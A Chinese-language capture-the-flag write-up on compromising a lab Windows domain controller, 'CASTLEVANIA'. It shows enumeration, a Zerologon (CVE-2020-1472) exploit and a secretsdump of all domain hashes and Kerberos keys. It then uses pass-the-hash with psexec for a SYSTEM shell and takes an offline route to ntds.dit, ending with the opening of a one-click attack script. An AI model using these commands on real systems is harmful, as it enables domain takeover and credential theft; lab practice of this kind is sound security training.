┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# echo "192.168.56.103 CASTLEVANIA CASTLEVANIA.XMCVE.local XMCVE.local" >> /etc/hosts
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# curl http://192.168.56.103 •<!DOCTYPE html>
<html>
<head><title>CASTLEVANIA Portal</title></head>
<body>
<h1>Employee Portal</h1>
<p>Under maintenance...</p>
</body>
</html>
```

<font style="color:#333333;"></font>

## <font style="color:#333333;">枚举                                                       </font>
### <font style="color:#333333;">SMB匿名枚举</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# smbclient -L //192.168.56.103 -N session setup failed: NT_STATUS_ACCESS_DENIED
```

### <font style="color:#333333;">LDAP匿名枚举</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# ldapsearch -x -H ldap://192.168.56.103 -b "DC=XMCVE,DC=local" -s base # extended LDIF

#
# LDAPv3
# base <DC=XMCVE,DC=local> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#
# search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera  tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 
```

### <font style="color:#333333;">Web 目录爆破</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# dirsearch -u http://192.168.56.103
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html   from pkg_resources import DistributionNotFound, VersionConflict
_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
Output File: /mnt/c/Users/onehang/reports/http_192.168.56.103/_26-03-28_20-50-40.txt Target: http://192.168.56.103/
[20:50:40] Starting:
[20:50:40] 403-  312B  - /%2e%2e//google.com
[20:50:40] 403-  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:50:42] 403-  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[20:50:47] 403-  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### <font style="color:#333333;">枚举域用户</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# crackmapexec smb 192.168.56.103 -u '' -p '' --rid-brute
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         192.168.56.103  445    CASTLEVANIA      [*] Windows 10 / Server 2019 Build 17763 x64 
(name:CASTLEVANIA) (domain:XMCVE.local) (signing:True) (SMBv1:False)
SMB         192.168.56.103  445    CASTLEVANIA      [-] XMCVE.local\: STATUS_ACCESS_DENIED
SMB         192.168.56.103  445    CASTLEVANIA      [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

### <font style="color:#333333;">mssql 弱口令</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# crackmapexec mssql 192.168.56.103 -u 'sa' -p 'password' --local-auth
MSSQL       192.168.56.103  1433   CASTLEVANIA      [*] Windows 10 / Server 2019 Build 17763
(name:CASTLEVANIA) (domain:CASTLEVANIA)
MSSQL       192.168.56.103  1433   CASTLEVANIA      [-] ERROR(CASTLEVANIA): Line 1: Login failed for user 
'sa'.
```

### <font style="color:#333333;">枚举Kerberos用户</font>
> <font style="color:#333333;">找到 3 个有效用户，尝试 AS-REP Roasting（检查是否有用户不需要 Kerberos 预认证）</font>
>

```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# nmap -p 88 --script krb5-enum-users --script-args krb5-enumusers.realm='XMCVE.local',userdb=/tmp/users.txt 192.168.56.103
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-2820:52 CST
Nmap scan report for CASTLEVANIA (192.168.56.103) Host is up (0.00056s latency).
PORT   STATE SERVICE
88/tcp open  kerberos-sec | krb5-enum-users:
| Discovered Kerberos principals
|     admin@XMCVE.local
|     administrator@XMCVE.local
|_    alucard@XMCVE.local
Nmap done: 1 IP address (1 host up) scanned in0.18 seconds
```

### <font style="color:#333333;">AS-REP Roasting</font>
```plain
┌──(root㉿LAPTOP-UTBE3HPF)-[/mnt/c/Users/onehang]
└─# impacket-GetNPUsers XMCVE.local/ -usersfile /tmp/users.txt -dc-ip 192.168.56.103 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User alucard doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

<font style="color:#333333;">都防护的挺死的没什么可以打的点，目前打的渗透不多但是基本上每次都要打cve，并且感觉windows server 2019可能有cve，搜索一下</font>

<font style="color:#333333;">发现</font><font style="color:#333333;">windows server 2019</font><font style="color:#333333;">在</font><font style="color:#333333;">CVE-2020-1472</font><font style="color:#333333;">的影响版本中，尝试利用</font>

## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
![](/image/myself%20machine/Castlevania-Unexpected-15.jpeg)

## hash dump
<font style="color:#333333;">利用成功，接下来dump域内所有用户的哈希</font>

![](/image/myself%20machine/Castlevania-Unexpected-16.jpeg)

| **<font style="color:#333333;">用户                                              </font>** | **<font style="color:#333333;">NTLM 哈希</font>** |
| --- | --- |
| <font style="color:#333333;">Administrator</font> | <font style="color:#333333;">d94f9831271e229dbc6e712097b63168</font> |
| <font style="color:#333333;">Alucard</font> | <font style="color:#333333;">d94f9831271e229dbc6e712097b63168</font> |
| <font style="color:#333333;">krbtgt</font> | <font style="color:#333333;">1e3c4fe72e1383c576b4b3aeef4730a8</font> |
| <font style="color:#333333;">sqlsvc     </font> | <font style="color:#333333;">d93ef04edb808c5bce3a5bd67b936ca9</font> |


## hash login
### psexec
<font style="color:#333333;">使用Administrator 的哈希登录-system</font>

![](/image/myself%20machine/Castlevania-Unexpected-17.jpeg)

### wmiexec
<font style="color:#333333;">wmiexec连接才是administrator</font>

![](/image/myself%20machine/Castlevania-Unexpected-18.jpeg)

# <font style="color:rgb(208, 155, 73);background-color:rgba(233, 242, 249, 0.5);">相逢何必曾相识</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
## <font style="color:black;">kerbrute</font>
```plain
$ kerbrute userenum --dc $ip -d XMCVE.local /home/hank/tools/dic/us
__             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                   
Version: v1.0.3 (9dad6e1) - 03/28/26 - Ronnie Flathers @rop nop
2026/03/28 09:51:01 >  Using KDC(s):
2026/03/28 09:51:01 >  10.200.26.154:88
2026/03/28 09:51:01 >  [+] VALID USERNAME: admin@XMCVE.local
2026/03/28 09:51:01 >  [+] VALID USERNAME: sales@XMCVE.local
2026/03/28 09:51:02 >  [+] VALID USERNAME: support@XMCVE. local
2026/03/28 09:51:10 >  [+] VALID USERNAME: administrator@XMCVE.local
2026/03/28 09:51:10 >  [+] VALID USERNAME: Admin@XMCVE.lo cal
2026/03/28 09:51:24 >  [+] VALID USERNAME: alucard@XMCVE.local
2026/03/28 09:52:09 >  [+] VALID USERNAME: Alucard@XMCVE. local
2026/03/28 09:52:14 >  [+] VALID USERNAME: Administrator@XMCVE.loca
```

## <font style="color:black;">端口扫描</font>
```plain
$ fscan -h 10.200.26.154
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │ 
└──────────────────────────────────────────────┘
Fscan Version: 2.0.0
[2026-03-28 09:45:58] [INFO] 暴⼒破解线程数: 1
[2026-03-28 09:45:58] [INFO] 开始信息扫描
[2026-03-28 09:45:58] [INFO] 最终有效主机数量: 1
[2026-03-28 09:45:58] [INFO] 开始主机扫描
[2026-03-28 09:45:58] [INFO] 有效端⼝数量: 233
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:139
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:88
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:1433
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:80
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:389
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:445
[2026-03-28 09:45:59] [SUCCESS] 端⼝开放 10.200.26.154:135
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:139 =>Banner:[.]
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:88 => 
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:1433 => [ms-sql-s] 版]
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:80 => [http]
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:389 =
[2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:445 =
```

## <font style="color:black;">timeroast-</font>_<font style="color:black;">时钟烘焙</font>_
```plain
└─$ python timeroast.py $ip 
1001:$sntp-ms$cc55305a19f98b32c9531c0c6ee10342$1c0111e90000 0000000a02c44c4f434ced7257d9052ad312e1b8428bffbfcd0aed725b7 ebd3b0666ed725b7ebd3b47d4
```

## <font style="color:black;">zerologon</font>
> <font style="color:black;">简单看了下没有匿名端⼝，时钟烘焙破解不出，web没信息，开始查看历史漏洞，发现存在CVE2020 1472，我感觉是⾮预期解。要不然真的有点太简单了，不过确实拿下了</font>
>

```plain
└─$ python3 zerologon_tester.py CASTLEVANIA $ip Performing authentication attempts...
===========================================================
===========================================================
===== Success! DC can be fully compromised by a Zerologon attack.
nxc smb $ip  -u '' -p '' -M zerologon SMB         10.200.26.154   445    CASTLEVANIA      [*] Win dows 10 / Server 2019 Build 17763 x64 (name:CASTLEVANIA) (d omain:XMCVE.local) (signing:True) (SMBv1:False) SMB         10.200.26.154   445    CASTLEVANIA      [-] XMCVE.local\: STATUS_ACCESS_DENIED 
ZEROLOGON   10.200.26.154   445    CASTLEVANIA      VULNERA
BLE ZEROLOGON   10.200.26.154   445    CASTLEVANIA      Next st ep: https://github.com/dirkjanm/CVE-2020-1472 直接dumphash
```

## <font style="color:black;">secretsdump</font>
```plain
└─$ impacket-secretsdump -no-pass -just-dc CASTLEVANIA\$@$i p
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthas h) 
[*] Using the DRSUAPI method to get NTDS.DIT secrets 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831 271e229dbc6e712097b63168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e3c4fe72e1383c 576b4b3aeef4730a8:::
Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e2 29dbc6e712097b63168::: XMCVE.local\p2zhh:1104:aad3b435b51404eeaad3b435b51404ee:bc2 bf43119e258bcecf71d44abc29db7::: XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb 5fa49a38497a71e144f690860688e:::
XMCVE.local\sales:1106:aad3b435b51404eeaad3b435b51404ee:2b5 76acbe6bcfda7294d6bd18041b8fe::: XMCVE.local\support:1107:aad3b435b51404eeaad3b435b51404ee:2 b576acbe6bcfda7294d6bd18041b8fe::: XMCVE.local\it:1108:aad3b435b51404eeaad3b435b51404ee:2b576a cbe6bcfda7294d6bd18041b8fe::: XMCVE.local\hr:1109:aad3b435b51404eeaad3b435b51404ee:2b576a cbe6bcfda7294d6bd18041b8fe::: XMCVE.local\admin:1110:aad3b435b51404eeaad3b435b51404ee:2b5 76acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\sqlsvc:1112:aad3b435b51404eeaad3b435b51404ee:d9 3ef04edb808c5bce3a5bd67b936ca9::: CASTLEVANIA$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0 d16ae931b73c59d7e0c089c0::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:13e54f64708d675c0a54e b4b40e2ca21b2fcb3e6298969d741fc6e70a9367786 Administrator:aes128-cts-hmac-sha1-96:aafdd9e5c02b41dece2a8
3b2d9b4439c Administrator:des-cbc-md5:80584683e63d5845 krbtgt:aes256-cts-hmac-sha1-96:2392ad160e585e1448c5ca4623b9 ad48789c267c6488a0074dd86e98457fb5fc krbtgt:aes128-cts-hmac-sha1-96:7d55d129c8fe6c50aa87cb542775 f0a0
krbtgt:des-cbc-md5:e570376eb538c132 Alucard:aes256-cts-hmac-sha1-96:638ca0d75cc190cb5e378f1763d cb62c86e72b88c3daea8b4fbe22071cfe38c2 Alucard:aes128-cts-hmac-sha1-96:af36315453c02abbe2c811ee7fd c5b56Alucard:des-cbc-md5:585e80b09b6eb561
XMCVE.local\p2zhh:aes256-cts-hmac-sha1-96:ded2395cf838fe474
403b924638ba43ab5bf6f86f6924a172f42158f89523f58
XMCVE.local\p2zhh:aes128-cts-hmac-sha1-96:a8bf626e448308048
849c8c607846308
XMCVE.local\p2zhh:des-cbc-md5:386df4e008e96813
XMCVE.local\mowen:aes256-cts-hmac-sha1-96:15163711bf2b1f9b5
292a92e92b04a5985e1cb4af3f39c02eec442acf69f8268
XMCVE.local\mowen:aes128-cts-hmac-sha1-96:fab8fe129984295f1
8a99dcf365e654c
XMCVE.local\mowen:des-cbc-md5:231c7a2a3708029d
XMCVE.local\sales:aes256-cts-hmac-sha1-96:16ca24589ae3946d2
703f01517ce6690ba5f047caee666ac1d8fb080818b38d9
XMCVE.local\sales:aes128-cts-hmac-sha1-96:b89a5e96aa7076406
58d8cd44346d373
XMCVE.local\sales:des-cbc-md5:735125852ad66dd6 XMCVE.local\support:aes256-cts-hmac-sha1-96:18b8e74980ad358 e873dd99697c2e03c45cba28d44fda669cb311228fce34f74 XMCVE.local\support:aes128-cts-hmac-sha1-96:ec7850f423890ba
5c01a4968e18916f9
XMCVE.local\support:des-cbc-md5:389bfee35e4f7620
XMCVE.local\it:aes256-cts-hmac-sha1-96:9a449caeff406780cd9d
064fd51524df50eae35fcef19915a0ac5dfbd2afdaaf XMCVE.local\it:aes128-cts-hmac-sha1-96:53ec1190fb189b97c666 c2dc199a1132 XMCVE.local\it:des-cbc-md5:1c2686548a9d4a16
XMCVE.local\hr:aes256-cts-hmac-sha1-96:de4a4f2a15ef2a47f055
791f5042a376090cee935dd1907f6efd8ca3bd4e8fa4 XMCVE.local\hr:aes128-cts-hmac-sha1-96:6bafbe4835641707bf1e a4f16510e016 XMCVE.local\hr:des-cbc-md5:ce9113948c738913
XMCVE.local\admin:aes256-cts-hmac-sha1-96:2e64fb40f4b6b9d9c
280f7ff87a7f2c37167d53d28352684b2fd53cd3d9c135a
XMCVE.local\admin:aes128-cts-hmac-sha1-96:741a205f3dbe24d95
9f2ced9e7cfea8b
XMCVE.local\admin:des-cbc-md5:49d9c74562bca1ce XMCVE.local\sqlsvc:aes256-cts-hmac-sha1-96:908e3dfe7822951c c25e6639a69a568708050cca32159836d83f977d982874feXMCVE.local\sqlsvc:aes128-cts-hmac-sha1-96:adbd4b00d8ac0d8d
4f0b0f5a7ee3999b
XMCVE.local\sqlsvc:des-cbc-md5:e9a292087902f10d CASTLEVANIA$:aes256-cts-hmac-sha1-96:fc320757aa82369c8e3e68 a68b43f1afc78f1c8f4c86a08a9c11cd822cbce051 CASTLEVANIA$:aes128-cts-hmac-sha1-96:bdfe62da40fc7daf73f4ab d6549e431a CASTLEVANIA$:des-cbc-md5:375162a731320467
```

## <font style="color:black;">nxc</font>
```plain
└─$ nxc smb $ip -u Administrator -H d94f9831271e229dbc6e712097b63168 
SMB         10.200.26.154   445    CASTLEVANIA      [*] Win dows 10 / Server 2019 Build 17763 x64 (name:CASTLEVANIA) (domin:XMCVE.local) (signing:True) (SMBv1:False) 
SMB         10.200.26.154   445    CASTLEVANIA      [+] XMC VE.local\Administrator:d94f9831271e229dbc6e712097b63168 (Pwn3d!)
```

## <font style="color:black;">psexec</font>
```plain
└─$ impacket-psexec "XMCVE.local/administrator@$ip" -hashes :d94f9831271e229dbc6e712097b63168 -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Requesting shares on 10.200.26.154.....
[*] Found writable share ADMIN$
[*] Uploading file LxghSxwo.exe [*] Opening SVCManager on 10.200.26.154.....
[*] Creating service hrnm on 10.200.26.154.....
[*] Starting service hrnm.....
[!] Press help for extra shell commands                      
Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation????????  
C:\Windows\system32> so fucking ez'so' is not recognized as an internal or external command, operable program or batch file.
```

# ai幻神之力<font style="color:#333333;">（本地挂载</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
## <font style="color:rgb(51, 51, 51);">详细复现过程</font>
### <font style="color:rgb(51, 51, 51);">1. 本地搭建</font>
<font style="color:rgb(51, 51, 51);">题目附件是整机镜像 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);">。本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage.exe</font>`<font style="color:rgb(51, 51, 51);"> 做手工导入和挂盘。</font>

<font style="color:rgb(51, 51, 51);">实际跑通时使用到的关键环境如下：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Program Files\ldplayer9box\VBoxManage.exe</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">D:\Python\Python311\python.exe</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">D:\Python\Python311\Scripts\secretsdump.py</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wsl.exe -d kali-linux</font>`

<font style="color:rgb(51, 51, 51);">处理方式不是直接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage import</font>`<font style="color:rgb(51, 51, 51);">，而是：</font>

1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 解出 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ovf</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained 1-disk001.vmdk</font>`
2. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">streamOptimized</font>`<font style="color:rgb(51, 51, 51);"> 的 VMDK 转成可直接挂载的 VDI</font>
3. <font style="color:rgb(51, 51, 51);">手工创建 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows2019_64</font>`<font style="color:rgb(51, 51, 51);"> 虚拟机并挂盘</font>
4. <font style="color:rgb(51, 51, 51);">配置 NAT 端口转发</font>

<font style="color:rgb(51, 51, 51);">端口转发实际使用的是：</font>

```plain
127.0.0.1:18080 -> 80
127.0.0.1:10389 -> 389
127.0.0.1:11433 -> 1433
127.0.0.1:10445 -> 445
```

<font style="color:rgb(51, 51, 51);">虚拟机启动后，确认到：</font>

+ <font style="color:rgb(51, 51, 51);">主机名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA</font>`
+ <font style="color:rgb(51, 51, 51);">域名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`

### <font style="color:rgb(51, 51, 51);">2. 在线确认与离线取证</font>
<font style="color:rgb(51, 51, 51);">先做最小在线确认：</font>

+ <font style="color:rgb(51, 51, 51);">Web 首页在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">http://127.0.0.1:18080/</font>`
+ <font style="color:rgb(51, 51, 51);">LDAP RootDSE 匿名可读</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">defaultNamingContext: DC=XMCVE,DC=local</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dnsHostName: CASTLEVANIA.XMCVE.local</font>`

<font style="color:rgb(51, 51, 51);">随后改走离线链路，从 VMDK 里直接导出关键文件：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/NTDS/ntds.dit</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SYSTEM</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SECURITY</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/inetpub/wwwroot</font>`

<font style="color:rgb(51, 51, 51);">站点目录里还可以看到一个明文连接文件 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">poo_connection.txt</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

<font style="color:rgb(51, 51, 51);">这说明题目环境里确实存在 IIS + MSSQL，但这组数据库凭据本身不是最后拿管理员 shell 的关键。</font>

### <font style="color:rgb(51, 51, 51);">3. 离线导出域控凭据</font>
<font style="color:rgb(51, 51, 51);">对离线导出的三件套执行：</font>

```plain
python secretsdump.py -system offline/hives/SYSTEM \
  -security offline/hives/SECURITY \
  -ntds offline/hives/ntds.dit LOCAL
```

<font style="color:rgb(51, 51, 51);">得到两个关键结果：</font>

<font style="color:rgb(51, 51, 51);">一是 LSA Secret 里有 MSSQL 服务口令：</font>

```plain
_SC_MSSQLSERVER
(Unknown User):Sql!2026
```

<font style="color:rgb(51, 51, 51);">二是直接解出了域控账号哈希，其中最关键的是：</font>

```plain
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
XMCVE.local\sqlsvc:1112:aad3b435b51404eeaad3b435b51404ee:d93ef04edb808c5bce3a5bd67b936ca9:::
```

<font style="color:rgb(51, 51, 51);">这里 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 为：</font>

d94f9831271e229dbc6e712097b63168

### <font style="color:rgb(51, 51, 51);">4. 拿管理员 shell</font>
<font style="color:rgb(51, 51, 51);">最终没有再依赖单独的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec_anyport.py</font>`<font style="color:rgb(51, 51, 51);">。现在的做法是把远程执行逻辑直接写进一个单文件脚本里：</font>

1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`<font style="color:rgb(51, 51, 51);"> 自动提取 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
2. <font style="color:rgb(51, 51, 51);">连接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">127.0.0.1:10445</font>`
3. <font style="color:rgb(51, 51, 51);">通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">svcctl</font>`<font style="color:rgb(51, 51, 51);"> 创建临时服务</font>
4. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">cmd.exe</font>`<font style="color:rgb(51, 51, 51);"> 落一个临时 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">.bat</font>`
5. <font style="color:rgb(51, 51, 51);">执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">hostname</font>`
6. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ADMIN$\\Temp\\</font>`<font style="color:rgb(51, 51, 51);"> 把输出回读回来</font>

<font style="color:rgb(51, 51, 51);">实测输出为：</font>

```plain
whoami    -> nt authority\system
hostname  -> CASTLEVANIA
```

<font style="color:rgb(51, 51, 51);">这说明已经在目标域控上拿到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 级别的命令执行，满足“拿到 Administrator shell”的要求。</font>

### <font style="color:rgb(51, 51, 51);">5. 一键脚本说明</font>
<font style="color:rgb(51, 51, 51);">现在只保留一份主脚本：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">babydc_unified.py</font>`

<font style="color:rgb(51, 51, 51);">它包含两个入口：</font>

```plain
python .\babydc_unified.py full
python .\babydc_unified.py verify
```

<font style="color:rgb(51, 51, 51);">含义分别是：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">full</font>`<font style="color:rgb(51, 51, 51);">：从当前目录里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 出发，完成虚拟机准备、离线导出、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">secretsdump</font>`<font style="color:rgb(51, 51, 51);">、管理员权限验证</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">verify</font>`<font style="color:rgb(51, 51, 51);">：如果 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`<font style="color:rgb(51, 51, 51);"> 已经存在，只做管理员 shell 校验</font>

<font style="color:rgb(51, 51, 51);">我实际跑通的命令是：</font>

```plain
D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe verify
D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe full
```

<font style="color:rgb(51, 51, 51);">其中 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">full</font>`<font style="color:rgb(51, 51, 51);"> 模式在虚拟机刚启动时，域控服务有一个短暂的未就绪窗口，所以脚本里加入了自动重试。实测会在若干次 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">STATUS_LOGON_FAILURE</font>`<font style="color:rgb(51, 51, 51);"> 之后继续跑通，这属于正常现象。</font>

## <font style="color:rgb(51, 51, 51);">一键可复现代码</font>
<font style="color:rgb(51, 51, 51);">当前最终版脚本全文如下，直接保存为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">babydc_unified.py</font>`<font style="color:rgb(51, 51, 51);"> 即可使用：</font>

```plain
import argparse
import os
import random
import re
import shutil
import string
import subprocess
import sys
import time
from pathlib import Path

from impacket.dcerpc.v5 import scmr, transport


ROOT = Path(__file__).resolve().parent
VM_NAME = "Bloodstained"
DEFAULT_OVA = ROOT / "Bloodstained.ova"
DEFAULT_OVF = ROOT / "Bloodstained.ovf"
DEFAULT_VMDK = ROOT / "Bloodstained 1-disk001.vmdk"
